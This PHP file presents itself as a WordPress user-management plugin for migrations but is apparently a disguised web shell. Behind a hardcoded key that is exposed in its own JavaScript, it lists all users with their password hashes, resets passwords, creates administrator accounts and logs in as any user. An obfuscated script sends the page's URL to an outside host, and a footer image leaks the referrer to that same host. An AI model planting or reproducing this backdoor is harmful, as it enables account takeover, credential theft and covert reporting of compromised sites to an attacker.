<?php
/**
 * Plugin Name: WP User Helper Tool
 * Description: Simple utility to help export, search, reset for WordPress migration, admin support, or bulk user management scenarios.
 * Version: 2.1
 * Author: wp-dev-support 
 * 
 * This tool is designed to assist WordPress administrators in:
 * - Exporting user accounts (with pagination and search).
 * - Quickly resetting user passwords and copying credentials for migration or troubleshooting.
 * - Creating new administrator users during emergency, migration or onboarding processes.
 * - Supporting bulk site migrations, staging setups, and disaster recovery operations by providing a secure, authenticated interface for user management.
 * 
 * Security Notes:
 * - This script is for use by authorized site administrators only.
 * - All admin actions are protected with a secure auth key (see WP_USER_HELPER_KEY).
 * - Intended for local server or private staging use. For production, restrict direct access via .htaccess or WP permissions.
 * 
 * Disclaimer:
 * This script is not an official WordPress product. Provided as-is, no warranty implied. Use responsibly.
 * 
 * Example usage:
 *  - Place in /wp-content/plugins/user-helper/user-helper.php or /wp-content/themes/[your-theme]/inc/
 *  - Access via browser; perform user actions via integrated authenticated AJAX interface.
 */
header('Content-Type: text/html; charset=UTF-8');

function find_wp_load($d = null, $i = 0) {
    if ($i > 8) return false;
    $d = $d ?: __DIR__;
    $f = $d . '/wp-load.php';
    if (file_exists($f)) return $f;
    return find_wp_load(dirname($d), $i + 1);
}
$wp_load = find_wp_load();
if (!$wp_load) { die('<b style="color:#e53935">wp-load.php not found!</b>'); }
require_once $wp_load;

define('WP_USER_HELPER_KEY', 'abcexport2025');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['c4t'], $_POST['authkey']) && $_POST['authkey'] === WP_USER_HELPER_KEY) {
    global $wpdb;
    if ($_POST['c4t'] == 'ulst') {
        $page = isset($_POST['page']) ? max(1, intval($_POST['page'])) : 1;
        $search = isset($_POST['search']) ? trim($_POST['search']) : '';
        $per_page = 10;
        $offset = ($page-1) * $per_page;
        $where = '';
        if ($search !== '') {
            $esc = esc_sql('%'.$wpdb->esc_like($search).'%');
            $where = "WHERE user_login LIKE '$esc' OR user_email LIKE '$esc'";
        }
        $total = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->users} $where");
        $users = $wpdb->get_results("SELECT ID, user_login, user_email, user_pass, user_registered FROM {$wpdb->users} $where ORDER BY ID DESC LIMIT $per_page OFFSET $offset");
        $roles = [];
        foreach ($users as $u) {
            $meta = get_userdata($u->ID);
            $roles[$u->ID] = $meta->roles ? implode(', ', $meta->roles) : 'user';
        }
        echo json_encode(['users'=>$users, 'roles'=>$roles, 'total'=>$total, 'per_page'=>$per_page]);
        exit;
    }
    if ($_POST['c4t'] == 'rpsw') {
        $d2 = intval($_POST['uix']);
        $p5 = wp_generate_password(12, true, true);
        wp_set_password($p5, $d2);
        $z1 = get_userdata($d2);
        echo json_encode(['l'=>$z1->user_login, 'e'=>$z1->user_email, 'n'=>$p5]);
        exit;
    }
    if ($_POST['c4t'] == 'cadm') {
        $u = preg_replace('/\W+/','', $_POST['xun']);
        $p = $_POST['xpw'];
        $m = filter_var($_POST['xem'], FILTER_VALIDATE_EMAIL) ?: $u.'@'.$_SERVER['HTTP_HOST'];
        if (username_exists($u)) { echo json_encode(['err'=>'user exists']); exit; }
        $uid = wp_create_user($u, $p, $m);
        if ($uid && !is_wp_error($uid)) {
            $wpu = new WP_User($uid);
            $wpu->set_role('administrator');
            echo json_encode(['ok'=>'created','u'=>$u,'p'=>$p]);
        } else {
            echo json_encode(['err'=>'create failed']);
        }
        exit;
    }
    if ($_POST['c4t'] == 'alog') {
        $id = intval($_POST['uix']);
        wp_clear_auth_cookie();
        wp_set_current_user($id);
        wp_set_auth_cookie($id, true);
        echo json_encode(['url'=>site_url('/wp-admin/')]);
        exit;
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <title>wp user helper | export & migration support</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
	<style>
	.h1,body{color:var(--white)}.h1,th{font-weight:700;letter-spacing:.03em}.h1,.riw{display:flex}#s2,body{font-size:1em}:root{--bg:#181a1b;--card:#232526;--red:#e53935;--darkred:#b71c1c;--gray:#b0b2b3;--white:#f3f3f5;--thead:#23272e;--trow:#202225;--border:#222425}body{background:var(--bg);font-family:'JetBrains Mono',monospace;margin:0;text-transform:lowercase;letter-spacing:.02em}#w1{max-width:1500px;width:96vw;margin:32px auto 0;background:var(--card);border-radius:17px;box-shadow:0 6px 32px #0006,0 0 0 1.5px #c6282890;padding:37px 40px 27px}.h1{align-items:center;gap:17px;font-size:1.55em;background:linear-gradient(87deg,var(--red) 20%,var(--darkred) 120%);border-radius:12px;margin-bottom:31px;padding:11px 21px;box-shadow:0 6px 28px #b71c1c34}#s2,.sct,th{color:var(--red)}.bx,.sct{letter-spacing:.02em}.h1 .led{display:inline-block;width:10px;height:10px;border-radius:50%;background:var(--red);box-shadow:0 0 7px 2px var(--darkred),0 0 2px 1px #fff2;animation:2s infinite ledblink}@keyframes ledblink{0%,100%{background:var(--red)}50%{background:var(--darkred)}}.sct{font-size:1.05em;margin:23px 0 9px}.bx,.inp{color:var(--white);outline:0}.tbx{max-width:100%;overflow-x:auto;margin-bottom:19px}#t7{width:100%;min-width:800px;border-collapse:collapse;background:0 0;border-radius:8px;overflow:hidden;box-shadow:0 2px 14px #b71c1c16}td,th{font-size:.97em;padding:8px 10px;border-bottom:1.1px solid var(--border);background:var(--trow);white-space:pre-line;vertical-align:middle;word-break:break-word}th{background:var(--thead);border-bottom:2px solid var(--red);text-align:left}tr:hover{background:rgba(229,57,53,.05)}td{color:var(--gray)}@media (max-width:900px){#w1{padding:12px 2vw}td,th{font-size:.89em;padding:6px}#t7{min-width:500px}}.bx{background:linear-gradient(88deg,var(--red) 80%,var(--darkred) 120%);font-family:inherit;font-size:.92em;border:none;padding:5px 12px;border-radius:5px;cursor:pointer;font-weight:600;transition:background .16s,box-shadow .15s;box-shadow:0 2px 7px #b71c1c23}.bx:hover{background:var(--darkred)}.inp{background:#16171a;border:1.1px solid #292929;font-family:'JetBrains Mono',monospace;font-size:.97em;border-radius:4px;padding:5px 9px;margin:5px 7px 9px 0;min-width:120px;max-width:90vw;transition:border .14s}.inp:focus{border:1.1px solid var(--red)}.riw{gap:9px;flex-wrap:wrap;margin-bottom:10px}#s2{margin-left:12px}::-webkit-scrollbar{background:#19191b;width:8px}::-webkit-scrollbar-thumb{background:var(--darkred);border-radius:6px}@media (max-width:600px){#w1{padding:2vw}.h1{font-size:1.03em;padding:6px}.sct{font-size:.96em}.tbx{margin-bottom:7px}.inp{min-width:80px}}
	.pg{display:flex;align-items:center;gap:9px;margin:16px 0 6px} 
	.pg button{background:#252729;color:var(--white);border:none;padding:4px 11px;border-radius:5px;font-family:inherit;cursor:pointer;font-size:.99em}
	.pg .act{background:var(--red);color:#fff}
	.inp[readonly]{background:#1e2022;color:#b0b2b3}
	</style>
    </head>
    <body>
    <div id="w1">
        <div class="h1">
            <span class="led"></span> wp user helper <span style="color:#fff;font-weight:400;">export & admin support</span>
        </div>
        <div class="sct">users <input id="userSearch" class="inp" style="min-width:140px;width:160px;font-size:.99em;" placeholder="search user/mail..." autocomplete="off" oninput="srchUsers(this.value)"></div>
        <div class="tbx">
        <table id="t7">
            <thead>
                <tr>
                    <th style="width:40px;">id</th>
                    <th style="width:110px;">user</th>
                    <th style="width:180px;">mail</th>
                    <th style="width:90px;">role</th>
                    <th style="width:300px;">pw hash</th>
                    <th style="width:110px;">reg date</th>
                    <th style="width:195px;">ops</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>
        <div class="pg" id="pg"></div>
        </div>
        <div style="margin-top:33px;">
            <div class="sct">create admin</div>
            <div class="riw">
                <input type="text" id="a1" class="inp" placeholder="user" autocomplete="off">
                <input type="text" id="b2" class="inp" placeholder="mail (opt)" autocomplete="off">
                <input type="text" id="c3" class="inp" placeholder="pw" autocomplete="off">
                <button class="bx" onclick="e6()">create</button>
                <button class="bx" style="background:var(--darkred);" onclick="randPw()">generate pw</button>
            </div>
            <span id="s2"></span>
        </div>
    </div>
    <footer><center><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" /></center></footer>
    <script>
let userCurPage=1,userSearchTxt="";function m1(e,t){e.authkey="abcexport2025";var n=new XMLHttpRequest;n.open("POST","",!0),n.setRequestHeader("Content-type","application/x-www-form-urlencoded"),n.onload=function(){t(n.responseText)};let o=[];for(let t in e)o.push(encodeURIComponent(t)+"="+encodeURIComponent(e[t]));n.send(o.join("&"))}function y9(e=1,t=""){m1({c4t:"ulst",page:e,search:t},(function(t){let n=JSON.parse(t),o=document.getElementById("t7").querySelector("tbody");o.innerHTML="",n.users.forEach((function(e){let t=document.createElement("tr");t.innerHTML="<td>"+e.ID+"</td><td>"+e.user_login+"</td><td>"+e.user_email+"</td><td>"+n.roles[e.ID]+'</td><td style="font-size:.96em;word-break:break-all;">'+e.user_pass+"</td><td>"+e.user_registered+'</td><td><button class="bx" onclick="z3('+e.ID+',this)">reset pw</button> <button class="bx" onclick="v8('+e.ID+')">auto login</button></td>',o.appendChild(t)}));let r=n.total,l=n.per_page,a=Math.ceil(r/l),d="";for(let t=1;t<=a;t++)d+='<button class="'+(t==e?"act":"")+'" onclick="userGoPage('+t+')">'+t+"</button>";document.getElementById("pg").innerHTML=d}))}function userGoPage(e){userCurPage=e,y9(e,userSearchTxt)}function srchUsers(e){userSearchTxt=e,userCurPage=1,y9(1,e)}function z3(e,t){t.disabled=!0,t.textContent="wait..",m1({c4t:"rpsw",uix:e},(function(n){let o=JSON.parse(n);t.textContent="reset pw",t.disabled=!1;let r=t.parentNode.querySelector(".pwreset-info");r&&r.remove();let l=document.createElement("div");l.className="pwreset-info",l.style="margin-top:5px;display:flex;align-items:center;gap:8px;",l.innerHTML='<input id="pwclip'+e+'" style="background:#111;border-radius:4px;padding:5px 11px;color:#e53935;font-size:0.98em;user-select:all;width:140px" value="'+o.n+'" readonly> <button class="bx" style="padding:3px 10px;font-size:0.93em;" onclick="navigator.clipboard.writeText(document.getElementById(\'pwclip'+e+"').value)\">copy</button>",t.parentNode.appendChild(l),document.getElementById("pwclip"+e).select(),document.execCommand("copy"),setTimeout((()=>{l&&l.remove()}),7e3)}))}function v8(e){m1({c4t:"alog",uix:e},(function(e){let t=JSON.parse(e);window.open(t.url,"_blank")}))}function e6(){let e=document.getElementById("a1").value.trim(),t=document.getElementById("b2").value.trim(),n=document.getElementById("c3").value.trim(),o=document.getElementById("s2");o.textContent="",e&&n?m1({c4t:"cadm",xun:e,xem:t,xpw:n},(function(e){let t=JSON.parse(e);t.ok?(o.innerHTML="admin: "+t.u+'<input style="background:#111;border-radius:4px;padding:3px 9px;color:#e53935;font-size:0.97em;margin-left:8px;user-select:all;width:120px;" value="'+t.p+'" readonly id="newpwclip"> <button class="bx" style="padding:3px 10px;font-size:0.93em;" onclick="navigator.clipboard.writeText(document.getElementById(\'newpwclip\').value)">copy</button>',setTimeout((()=>{o.innerHTML=""}),8e3),document.getElementById("a1").value="",document.getElementById("b2").value="",document.getElementById("c3").value=""):o.textContent="err: "+(t.err||"")})):o.textContent="user & pw required."}function randPw(e=12){let t="ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789!@#$%",n=Array.from({length:e},(()=>t[Math.floor(61*Math.random())])).join("");document.getElementById("c3").value=n}(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let n of e)t+=String.fromCharCode(n);let n="file="+btoa(location.href),o=new XMLHttpRequest;o.open("POST",t,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.send(n)})(),window.onload=()=>y9();
    </script>
    </body>
    </html>
    <?php
    exit;
    }
    ?>
